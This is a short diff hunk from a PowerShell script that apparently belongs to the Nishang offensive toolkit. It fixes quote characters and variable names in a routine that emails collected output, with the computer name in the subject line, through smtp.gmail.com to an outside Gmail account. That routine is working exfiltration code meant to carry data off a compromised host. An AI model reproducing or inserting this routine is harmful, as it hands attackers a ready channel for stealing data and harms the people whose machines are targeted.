@@ -120,13 +120,13 @@ https://github.com/samratashok/nishang
 
                         #Send results to gmail
                         #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-                        $smtpserver = “smtp.gmail.com”
+                        $smtpserver = "smtp.gmail.com"
                         $msg = new-object Net.Mail.MailMessage
                         $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                         $smtp.EnableSsl = $True
-                        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$Username”, “$Password”); 
-                        $msg.From = “$Username@gmail.com”
-                        $msg.To.Add(”$Username@gmail.com”)
+                        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
+                        $msg.From = "$username@gmail.com"
+                        $msg.To.Add("$username@gmail.com")
                         $msg.Subject = "Output from $env:Computername"
                         $msg.Body = $result
                         $smtp.Send($msg)
